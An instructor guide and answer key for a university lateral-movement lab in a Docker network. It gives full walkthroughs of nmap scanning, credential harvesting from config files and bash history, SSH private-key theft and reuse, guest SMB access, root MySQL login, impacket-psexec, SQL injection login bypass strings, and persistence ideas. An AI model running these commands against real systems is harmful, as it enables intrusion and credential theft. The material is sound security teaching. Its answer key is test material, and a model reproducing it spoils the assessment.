# Instructor Guide: Lateral Movement Lab

**CYB204 Ethical Hacking - Week 9**

## Table of Contents

1. [Lab Overview](#lab-overview)
2. [Learning Objectives](#learning-objectives)
3. [Pre-Lab Setup](#pre-lab-setup)
4. [Complete Solution Walkthrough](#complete-solution-walkthrough)
5. [Common Student Issues](#common-student-issues)
6. [Grading Rubric](#grading-rubric)
7. [Discussion Points](#discussion-points)
8. [Extended Challenges](#extended-challenges)

---

## Lab Overview

### Purpose
This lab teaches students practical lateral movement techniques in a safe, isolated Docker environment. Students will learn how attackers pivot through networks after initial compromise.

### Time Required
- Setup: 15-20 minutes (first time)
- Lab completion: 90-120 minutes
- Discussion: 30 minutes

### Technical Requirements
- Docker Desktop or Docker Engine
- 4GB RAM minimum (8GB recommended)
- 10GB disk space
- All major platforms supported (Windows/Mac/Linux)

---

## Learning Objectives

By completing this lab, students will:

1. **Enumerate** networks to discover hosts and services
2. **Extract** credentials from file systems and configuration files
3. **Exploit** trust relationships (SSH, SMB)
4. **Execute** remote code through various services
5. **Understand** defensive measures to prevent lateral movement

---

## Pre-Lab Setup

### For Instructors

**1. Test the environment before class:**

```bash
cd movement
docker-compose up -d
docker-compose ps  # Verify all 8 containers are running
```

**2. Verify all services are accessible:**

```bash
# Test from secutils container
docker exec -it secutils /bin/bash
nmap -sV 172.20.0.20
ssh labuser@172.20.0.20  # Password: Password123
smbclient -L //172.20.0.20 -N
exit
```

**3. Common pre-lab checks:**

```bash
# Check available disk space
docker system df

# Ensure Docker has enough memory allocated
# Docker Desktop: Settings → Resources → Memory (minimum 4GB)

# Pull images ahead of time to save bandwidth
docker-compose pull
```

**4. Prepare demonstration:**
- Have the environment running during lecture
- Prepare screenshots of key steps
- Test on the same OS your students use

---

## Complete Solution Walkthrough

### Part 1: Network Enumeration

#### Task 1.1: Network Host Discovery

**From secutils container:**

```bash
docker exec -it secutils /bin/bash
```

**Command:**
```bash
nmap -sP 172.20.0.0/24
```

**Expected Output:**
```
Nmap scan report for 172.20.0.1 (gateway)
Nmap scan report for 172.20.0.10
Nmap scan report for 172.20.0.20
Nmap scan report for 172.20.0.30
Nmap scan report for 172.20.0.40
Nmap scan report for 172.20.0.50
Nmap scan report for 172.20.0.60
Nmap scan report for 172.20.0.70
Nmap scan report for 172.20.0.80
```

**Answer:** 8 active hosts (plus gateway) on 172.20.0.0/24

#### Task 1.2: Service Discovery

**Command:**
```bash
nmap -sV 172.20.0.20
```

**Expected Output:**
```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.4p1 Debian
139/tcp open  netbios-ssn Samba smbd 4.x
445/tcp open  netbios-ssn Samba smbd 4.x
```

**Answer:** SSH (port 22) and Samba/SMB (ports 139, 445) are running

**Additional scans students should perform:**

```bash
# Ubuntu-desktop
nmap -sV 172.20.0.30
# Output: SSH on port 22

# MySQL
nmap -sV 172.20.0.50
# Output: MySQL on port 3306

# Telnet
nmap -sV 172.20.0.60
# Output: Telnet on port 23

# LDAP
nmap -sV 172.20.0.40
# Output: LDAP on port 389
```

**Teaching Point:** Emphasize the importance of thorough enumeration as the foundation for lateral movement.

---

### Part 2: Credential Dumping

#### Task 2: Linux Credential Dumping

**Access workstation:**
```bash
docker exec -it workstation /bin/sh
```

**Command:**
```bash
cat /etc/passwd
```

**Expected Output:**
```
root:x:0:0:root:/root:/bin/bash
labuser:x:1000:1000::/home/labuser:/bin/bash
admin:x:1001:1001::/home/admin:/bin/bash
```

**Answer:** Yes, /etc/passwd is world-readable (normal behavior)

**Command:**
```bash
cat /etc/shadow
```

**Expected Output:**
```
cat: /etc/shadow: Permission denied
```

**Answer:** No, /etc/shadow requires root privileges (proper security)

**Teaching Point:** Explain the difference between /etc/passwd (world-readable) and /etc/shadow (protected)

**Search for weak permissions:**
```bash
find / -type f -perm -o+w 2>/dev/null | head -20
```

**Expected findings:**
- /shared/notes.txt
- /shared/credentials.txt
- Various /tmp files

**Search for configuration files:**
```bash
find /home -name "*.txt" -o -name "*.conf" -o -name "*.config" 2>/dev/null
cat /home/labuser/config.txt
```

**Expected Output:**
```
DB_PASSWORD=SuperSecret123
```

**Answer:** Found database password in world-readable configuration file

**Teaching Point:** Discuss why configuration files should have restricted permissions (600 or 640)

#### Task 3: Extract Credentials from Ubuntu-Desktop

**Access ubuntu-desktop:**
```bash
docker exec -it ubuntu-desktop /bin/bash
```

**Command:**
```bash
find /home -name "*.config" -o -name "*.ini" 2>/dev/null
```

**Expected Output:**
```
/home/developer/.config/app/config.ini
```

**View the config file:**
```bash
cat /home/developer/.config/app/config.ini
```

**Expected Output:**
```
[database]
host=172.20.0.50
username=dbuser
password=dbpass123
```

**Find additional credentials:**
```bash
cat /home/developer/credentials.txt
```

**Expected Output:**
```
=== Application Credentials ===
LDAP Admin: cn=admin,dc=cyb204,dc=local / admin123
MySQL: root / root123
```

**Check bash history:**
```bash
cat /home/developer/.bash_history
```

**Expected Output:**
```
ssh admin@172.20.0.20
mysql -h 172.20.0.50 -u root -p
cat /etc/shadow
```

**Answer:** Found database credentials, LDAP credentials, and evidence of previous reconnaissance

**Teaching Point:** Bash history files often reveal attack patterns, credentials, and system usage

---

### Part 3: Exploit Trust Relationships

#### Task 4: SMB Share Access

**From secutils container:**
```bash
smbclient -L //172.20.0.20 -N
```

**Expected Output:**
```
Sharename       Type      Comment
---------       ----      -------
shared          Disk
IPC$            IPC       IPC Service
```

**Answer:** Yes, a share named "shared" is available with guest access

**Connect to the share:**
```bash
smbclient //172.20.0.20/shared -N
```

**SMB commands:**
```
smb: \> ls
  .                                   D        0  [date]
  ..                                  D        0  [date]
  notes.txt                           N       32  [date]
  credentials.txt                     N       24  [date]

smb: \> get notes.txt
smb: \> get credentials.txt
smb: \> exit
```

**View the files:**
```bash
cat notes.txt
cat credentials.txt
```

**Expected Output:**
```
# notes.txt
Shared file with sensitive info

# credentials.txt
API_KEY=abc123xyz789
```

**Answer:** Found API key and sensitive notes in openly shared directory

**Teaching Point:** Guest-accessible SMB shares are a common security misconfiguration

#### Task 5: SSH Key Exploitation

**From secutils, attempt SSH:**
```bash
ssh labuser@172.20.0.20
# Password: Password123
```

**Expected:** Successful login

**Answer:** Yes, able to access using discovered password

**Once logged in, search for SSH keys:**
```bash
find /home -name id_rsa 2>/dev/null
```

**Expected Output:**
```
/home/labuser/.ssh/id_rsa
```

**View the key:**
```bash
cat /home/labuser/.ssh/id_rsa
```

**Expected Output:**
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
[... SSH private key content ...]
-----END OPENSSH PRIVATE KEY-----
```

**Copy the key:**
```bash
# In another terminal on your host machine
docker exec workstation cat /home/labuser/.ssh/id_rsa > stolen_key.txt

# Or from secutils container
# Copy the key content and create a file
exit  # Exit from workstation
```

**Back in secutils:**
```bash
# Create the key file (paste the content)
cat > stolen_key << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
[paste the key here]
-----END OPENSSH PRIVATE KEY-----
EOF

chmod 600 stolen_key
```

**Attempt to use the key on other systems:**
```bash
ssh -i stolen_key labuser@172.20.0.30
```

**Expected:** Connection refused or authentication failure (user doesn't exist on ubuntu-desktop)

```bash
ssh -i stolen_key labuser@172.20.0.20
```

**Expected:** Successful passwordless authentication

**Answer:** SSH keys can be reused if the same user exists on multiple systems with proper key authorization

**Teaching Point:**
- SSH keys provide convenience but can be exploited if compromised
- Private keys should be encrypted with passphrases
- Key-based authentication is still more secure than passwords when properly managed

---

### Part 4: Remote Code Execution

#### Task 6: Exploit Remote Services

**MySQL Access:**
```bash
mysql -h 172.20.0.50 -u root -proot123
```

**Expected:** Successful connection

**SQL commands:**
```sql
SHOW DATABASES;
```

**Expected Output:**
```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| testdb             |
+--------------------+
```

**Continue:**
```sql
USE testdb;
SHOW TABLES;
EXIT;
```

**Answer:** Yes, able to connect with root privileges. Databases: testdb, mysql, and system databases

**Teaching Point:** Remote root access to MySQL is a critical vulnerability

**Telnet Access:**
```bash
telnet 172.20.0.60
```

**Login:**
```
Username: telnetuser
Password: Telnet123
```

**Expected:** Successful login

**Try commands:**
```bash
whoami
ls
exit
```

**Answer:** All credentials and commands are transmitted in cleartext, easily intercepted

**Teaching Point:** Demonstrate with Wireshark or tcpdump how telnet traffic is unencrypted

**Impacket PSExec:**
```bash
impacket-psexec labuser:Password123@172.20.0.20
```

**Expected Output:**
```
[*] Requesting shares on 172.20.0.20.....
[*] Found writable share ADMIN$
[*] Uploading file [...]
[*] Opening SVCManager on 172.20.0.20.....
[*] Starting service [...]
```

Or if SMB is properly configured:
```
[-] SMB SessionError: [error details]
```

**Answer:** Depends on SMB configuration. If successful, gain SYSTEM/root level access

**Teaching Point:** PSExec-style attacks leverage SMB for remote code execution

**Web Application Testing:**

Open browser to http://localhost:8080 (DVWA)

**SQL Injection on login:**
```
Username: admin' OR '1'='1
Password: [anything]
```

Or try:
```
Username: admin' #
Password: [anything]
```

**Expected:** Successful bypass (depending on DVWA security level)

**Answer:** SQL injection allows authentication bypass

**Teaching Point:** Web applications are often overlooked entry points for lateral movement

---

### Part 5: Complete Attack Chain Example

**Demonstration for students:**

**Step 1: Initial Reconnaissance**
```bash
# From secutils
nmap -sP 172.20.0.0/24
nmap -sV 172.20.0.20 172.20.0.30 172.20.0.50
```
**Result:** Identified 3 key targets with SSH, SMB, and MySQL

**Step 2: Gain Initial Access**
```bash
# Access workstation via SMB
smbclient //172.20.0.20/shared -N
smb: \> get credentials.txt
smb: \> exit
cat credentials.txt  # Found API key
```
**Method:** Guest SMB access
**Credentials:** API_KEY=abc123xyz789

**Step 3: Lateral Movement**
```bash
# Try SSH with common passwords
ssh labuser@172.20.0.20
# Password: Password123 (guessed based on common patterns)
```
**Method:** Password guessing/credential reuse
**Result:** Successful SSH access to workstation

**Step 4: Credential Harvesting**
```bash
# On workstation
cat /home/labuser/config.txt  # Found DB_PASSWORD=SuperSecret123
cat /home/labuser/.ssh/id_rsa  # Found SSH private key
find /shared -type f -exec cat {} \;  # More credentials
```
**Evidence:** Multiple credentials discovered

**Step 5: Pivot to Next Target**
```bash
# From workstation, access ubuntu-desktop
ssh developer@172.20.0.30
# Try password: Dev2023! (found in notes)
```

**Step 6: Access Database**
```bash
# From ubuntu-desktop
mysql -h 172.20.0.50 -u root -proot123
SHOW DATABASES;
USE testdb;
SELECT * FROM sensitive_data;  # If table exists
```
**Method:** Direct database access with stolen credentials
**Success:** Full access to database server

**Teaching Point:** Attackers chain multiple techniques together, using each compromise to enable the next

---

## Common Student Issues

### Issue 1: Containers Won't Start

**Symptoms:**
- "Error: port already in use"
- Container shows "Exited" status

**Solutions:**
```bash
# Check what's using the ports
docker ps -a

# Stop conflicting containers
docker stop $(docker ps -aq)

# Remove old containers
docker-compose down -v

# Restart clean
docker-compose up -d
```

### Issue 2: Can't Connect Between Containers

**Symptoms:**
- "Connection refused"
- "No route to host"

**Solutions:**
```bash
# Verify network exists
docker network inspect cyb204_net

# Check container IPs
docker inspect secutils | grep IPAddress

# Ensure containers are on same network
docker network connect cyb204_net secutils
```

### Issue 3: Permission Denied Errors

**Symptoms:**
- "Permission denied" when running docker commands

**Solutions:**
```bash
# Linux: Add user to docker group
sudo usermod -aG docker $USER
newgrp docker

# Windows/Mac: Ensure Docker Desktop is running with admin rights
```

### Issue 4: Out of Memory

**Symptoms:**
- Containers randomly stopping
- "Cannot allocate memory"

**Solutions:**
- Docker Desktop: Increase memory in Settings → Resources
- Stop unnecessary containers: `docker-compose stop juice-shop dvwa`
- Close other applications

### Issue 5: Commands Not Found in secutils

**Symptoms:**
- "nmap: not found"
- "impacket-psexec: not found"

**Solutions:**
```bash
# Rebuild the container
docker-compose build --no-cache secutils
docker-compose up -d
```

### Issue 6: SMB/Samba Not Working

**Symptoms:**
- "protocol negotiation failed"
- smbclient connection errors

**Solutions:**
```bash
# Use legacy protocol
smbclient -L //172.20.0.20 -N --option='client min protocol=NT1'

# Check if smbd is running in workstation
docker exec workstation service smbd status
docker exec workstation service smbd restart
```

---

## Grading Rubric

### Total Points: 100

#### Part 1: Network Enumeration (20 points)
- Network scan results (10 points)
  - All active hosts identified
  - Proper use of nmap
- Service discovery (10 points)
  - Services and versions identified
  - Network map created

#### Part 2: Credential Dumping (25 points)
- Linux credential extraction (12 points)
  - Attempted /etc/passwd and /etc/shadow
  - Found weak permission files
  - Discovered credentials in config files
- Ubuntu credential extraction (13 points)
  - Found configuration files
  - Extracted passwords
  - Checked bash history

#### Part 3: Trust Exploitation (25 points)
- SMB share access (12 points)
  - Listed shares
  - Accessed shared directory
  - Retrieved files
- SSH exploitation (13 points)
  - Successful SSH connection
  - Found SSH private keys
  - Attempted key reuse

#### Part 4: Remote Code Execution (15 points)
- Multiple service exploitation (10 points)
  - MySQL access
  - Telnet access
  - Web application testing
- Impacket/advanced techniques (5 points)
  - Attempted PSExec or similar

#### Part 5: Attack Chain (10 points)
- Complete path documented (7 points)
- Logical progression shown (3 points)

#### Part 6: Reflection (5 points)
- Thoughtful answers to all questions
- Understanding of defensive measures

### Deductions:
- Missing screenshots: -2 points each (max -10)
- Incomplete commands/outputs: -5 points
- No attempt at difficult sections: -5 points per section

---

## Discussion Points

### Post-Lab Discussion Questions

**1. Real-World Implications**
- "How would these techniques differ in a corporate environment?"
- "What additional obstacles would attackers face?"

**2. Detection and Prevention**
- "How could an organization detect the lateral movement you performed?"
- "What logs would reveal your activities?"
- "What security controls could have prevented your success?"

**3. Ethical Considerations**
- "Why is authorization critical before performing penetration testing?"
- "What are the legal consequences of unauthorized lateral movement?"

**4. Tool Understanding**
- "Why is nmap the industry standard for network scanning?"
- "What makes Impacket powerful for Windows environments?"
- "Why are SMB shares commonly misconfigured?"

### Key Concepts to Reinforce

1. **Enumeration is Critical**
   - Thorough reconnaissance enables successful lateral movement
   - Automated tools miss nuances; manual verification is essential

2. **Credential Reuse**
   - Users often reuse passwords across systems
   - Finding one credential can unlock multiple systems

3. **Trust Relationships**
   - Systems often trust each other implicitly
   - SSH keys, Kerberos tickets, and certificates enable movement

4. **Defense in Depth**
   - No single control prevents lateral movement
   - Multiple layers create resilience

5. **Least Privilege**
   - Excessive permissions accelerate lateral movement
   - Proper access control limits attacker options

---

## Extended Challenges

For advanced students who complete the lab early:

### Challenge 1: Network Segmentation Analysis
**Task:** Propose a network segmentation strategy to limit lateral movement
**Deliverable:** Network diagram with VLAN/subnet design

### Challenge 2: Automated Credential Harvesting
**Task:** Write a script to automatically search for and extract credentials from all containers
**Hint:** Use bash scripting with find, grep, and awk

```bash
#!/bin/bash
# Example structure
for container in workstation ubuntu-desktop; do
    docker exec $container find /home -type f -name "*.txt" -o -name "*.ini"
done
```

### Challenge 3: Detection Rules
**Task:** Write Snort/Suricata rules to detect the lateral movement techniques used
**Example:**
```
alert tcp any any -> any 445 (msg:"SMB Share Enumeration"; content:"|ff|SMB"; sid:1000001;)
```

### Challenge 4: Privilege Escalation
**Task:** Find and exploit a privilege escalation vulnerability to gain root access
**Hint:** Look for SUID binaries or sudo misconfigurations

```bash
find / -perm -4000 2>/dev/null
sudo -l
```

### Challenge 5: Persistence Mechanisms
**Task:** Establish persistence on the workstation container
**Methods to explore:**
- Cron jobs
- SSH authorized_keys
- Bashrc modifications
- systemd services

### Challenge 6: Traffic Analysis
**Task:** Use tcpdump to capture and analyze lateral movement traffic
```bash
docker exec secutils tcpdump -i eth0 -w /shared/capture.pcap
# Analyze with Wireshark on host
```

---

## Teaching Tips

### Before the Lab

1. **Demonstrate Docker basics** if students are unfamiliar
2. **Show one complete example** of lateral movement
3. **Explain ethical boundaries** and legal requirements
4. **Set expectations** for time and difficulty

### During the Lab

1. **Circulate frequently** to catch common issues early
2. **Group similar questions** and address to whole class
3. **Encourage students to help each other** (with guidance)
4. **Be prepared for resource issues** on low-powered laptops

### After the Lab

1. **Demonstrate the complete attack chain** start to finish
2. **Show defensive tools** (IDS alerts, log analysis)
3. **Discuss real-world case studies** of lateral movement
4. **Connect to certification content** (CEH, OSCP, etc.)

---

## Additional Resources

### For Students
- MITRE ATT&CK: Lateral Movement (T1021)
- Red Team Field Manual (RTFM)
- HackTricks: Lateral Movement section
- SANS Penetration Testing course materials

### For Instructors
- NIST Cybersecurity Framework: Detection and Response
- CIS Controls: Lateral Movement Prevention
- MITRE D3FEND: Movement countermeasures
- Purple Team exercises for lateral movement

---

## Lab Maintenance

### Weekly Tasks
- Verify all containers still build correctly
- Test on student OS environments
- Update credentials if needed

### Semesterly Tasks
- Update vulnerable web apps (juice-shop, DVWA)
- Review for new lateral movement techniques
- Update documentation with student feedback

### Backup and Recovery
```bash
# Save container configurations
docker-compose config > backup-config.yml

# Export custom images
docker save secutils:latest | gzip > secutils-backup.tar.gz

# Restore if needed
docker load < secutils-backup.tar.gz
```

---

## Assessment Answer Key

### Part 1 Answers

**Q1.1:** 172.20.0.10, .20, .30, .40, .50, .60, .70, .80 (8 hosts + gateway)

**Q1.2:** SSH (22), Samba SMB (139, 445)

**Q1.3:** See network map table in walkthrough

### Part 2 Answers

**Q2.1:** /etc/passwd - yes (world-readable), /etc/shadow - no (root only)

**Q2.2:** /shared/notes.txt, /shared/credentials.txt, /home/labuser/config.txt

**Q2.3:** DB_PASSWORD=SuperSecret123, API_KEY=abc123xyz789

**Q3.1:** /home/developer/.config/app/config.ini, /home/developer/credentials.txt

**Q3.2:** dbuser/dbpass123, root/root123, LDAP admin/admin123

**Q3.3:** SSH attempts, MySQL connections, attempted /etc/shadow access

### Part 3 Answers

**Q4.1:** Yes, "shared" directory with guest access

**Q4.2:** notes.txt (sensitive info), credentials.txt (API key)

**Q5.1:** Yes, using password Password123

**Q5.2:** Yes, /home/labuser/.ssh/id_rsa

**Q5.3:** Depends on key authorization on other systems (typically no)

### Part 4 Answers

**Q6.1:** Yes, root access. Databases: testdb, mysql, information_schema, etc.

**Q6.2:** Username, password, all commands - completely unencrypted

**Q6.3:** Varies by configuration; potentially SYSTEM/root level access

**Q6.4:** Varies; SQL injection should work on DVWA low security

### Reflection Answers (Example Responses)

**R.1:** Credential harvesting from config files was most effective because developers often hardcode passwords. SMB shares provided easy initial access.

**R.2:** Weak permissions on files, password reuse, guest SMB access, unencrypted protocols (telnet), hardcoded credentials in config files.

**R.3:** Implement least privilege, encrypt sensitive files, disable guest SMB access, use SSH keys with passphrases, implement network segmentation, enable logging and monitoring, use MFA where possible.

**R.4:** Lateral movement allows attackers to escalate privileges, access sensitive data, establish persistence, and achieve their ultimate objectives after initial compromise.

**R.5:** SIEM alerts for unusual SSH connections, SMB access logs, failed authentication attempts, privilege escalation attempts, network traffic analysis, endpoint detection and response (EDR) tools.

---

## Quick Reference Commands

### Docker Management
```bash
# Start lab
docker-compose up -d

# Stop lab
docker-compose stop

# View logs
docker-compose logs [container_name]

# Restart single container
docker-compose restart [container_name]

# Rebuild after changes
docker-compose build --no-cache
docker-compose up -d

# Complete cleanup
docker-compose down -v
docker system prune -a
```

### Access Containers
```bash
docker exec -it secutils /bin/bash
docker exec -it workstation /bin/sh
docker exec -it ubuntu-desktop /bin/bash
```

### Verification Commands
```bash
# Check all IPs
for container in secutils workstation ubuntu-desktop ldap mysql telnet juice-shop dvwa; do
    echo -n "$container: "
    docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' $container
done

# Test connectivity from secutils
docker exec secutils ping -c 2 172.20.0.20
```

---

**Last Updated:** 2025
**Version:** 1.0
**Tested On:** Docker Desktop 4.x, Docker Engine 24.x

